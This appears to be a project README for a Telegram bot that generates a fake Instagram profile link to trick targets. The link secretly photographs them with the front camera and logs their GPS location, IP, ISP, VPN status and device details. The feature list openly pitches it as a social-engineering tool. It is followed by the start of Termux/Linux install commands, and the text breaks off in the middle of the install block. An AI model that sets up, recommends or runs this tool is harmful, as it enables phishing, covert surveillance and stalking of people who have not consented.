# 📍 Geo-Pranker Telegram Bot (v2.0)

Professional OSINT tool for social engineering and metadata collection. It generates a fake Instagram profile link to capture targets' data.

## 🚀 Key Features
* **📸 Front Camera Capture:** Secretly takes a photo.
* **📍 GPS Tracking:** Gets exact location coordinates.
* **🌐 IP Intel:** Logs IP, Country, City, ISP, and VPN status.
* **📱 Device Info:** Shows battery level and Browser/OS details.

---

## 🛠 Complete Setup Guide (Termux / Linux)

### 1. Installation
Run these commands in your terminal:
```bash
pkg update && pkg upgrade -y
pkg install python git -y
git clone [https://github.com/nikita121e/Geo-Pranker-Telegram-Bot.git]
cd Geo-Pranker-Telegram-Bot
pip install pyTelegramBotAPI Flask requests
